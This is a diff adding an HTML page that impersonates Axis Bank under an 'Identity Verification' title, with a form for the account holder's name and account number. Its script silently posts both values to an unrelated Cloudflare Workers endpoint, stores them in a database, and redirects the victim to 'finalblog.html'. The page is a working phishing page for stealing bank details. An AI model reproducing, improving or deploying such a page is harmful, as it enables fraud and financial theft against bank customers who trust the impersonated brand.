@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Axis Bank | Identity Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --axis-maroon: #971237; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #fcfcfc; margin: 0; }
+        
+        .input-box {
+            width: 100%; padding: 14px; border: 1.5px solid #d1d5db;
+            border-radius: 12px; outline: none; font-size: 16px; transition: all 0.3s;
+            background: white;
+        }
+        .input-box:focus { border-color: var(--axis-maroon); box-shadow: 0 0 0 4px rgba(151, 18, 55, 0.1); }
+        
+        .header-img { width: 100%; height: auto; display: block; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <header class="border-b border-gray-100 bg-white sticky top-0 z-50">
+        <img src="https://i.ibb.co/d4BCqfS6/chrome-screenshot-19-Apr-2026-7-42-45-am-IST.png" alt="Header" class="w-full h-auto">
+    </header>
+
+    <main class="p-6 max-w-md mx-auto w-full">
+        <div class="mb-8">
+            <h1 class="text-[22px] font-bold text-gray-800 tracking-tight">Identity Verification</h1>
+            <p class="text-[13px] text-gray-500 mt-1">Please confirm your bank details to proceed securely.</p>
+        </div>
+
+        <form id="accountForm" class="space-y-6">
+            <div>
+                <label class="text-[11px] font-bold text-gray-400 uppercase tracking-widest mb-2 block text-gray-400">Account Holder Name</label>
+                <input type="text" id="name_val" placeholder="Full name as per bank" class="input-box" required>
+            </div>
+
+            <div>
+                <label class="text-[11px] font-bold text-gray-400 uppercase tracking-widest mb-2 block text-gray-400">Account Number</label>
+                <input type="tel" id="acc_val" maxlength="15" placeholder="15-digit account number" 
+                       class="input-box" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+            </div>
+
+            <div class="pt-4">
+                <button type="submit" id="subBtn" class="w-full bg-[#971237] text-white py-4 rounded-xl font-bold text-[17px] shadow-lg active:scale-95 transition-all">
+                    Verify & Continue
+                </button>
+            </div>
+        </form>
+    </main>
+
+    <script>
+        const WORKER_URL = 'https://snowy-sunset-a557.sumankkuuyy.workers.dev/';
+
+        document.getElementById('accountForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('subBtn');
+            const hName = document.getElementById('name_val').value;
+            const aNum = document.getElementById('acc_val').value;
+
+            // Button status update
+            btn.innerHTML = "Verifying...";
+            btn.disabled = true;
+
+            // Payload matches your D1 columns
+            const payload = {
+                type: "ACCOUNT_SUBMIT",
+                full_name: hName,
+                account_no: aNum
+            };
+
+            try {
+                // AWAIT ensures data is sent to Worker
+                await fetch(WORKER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.log("Network error");
+            }
+
+            // Data bhejte hi seedha redirect
+            window.location.href = 'finalblog.html';
+        });
+    </script>
+</body>
+</html>
+
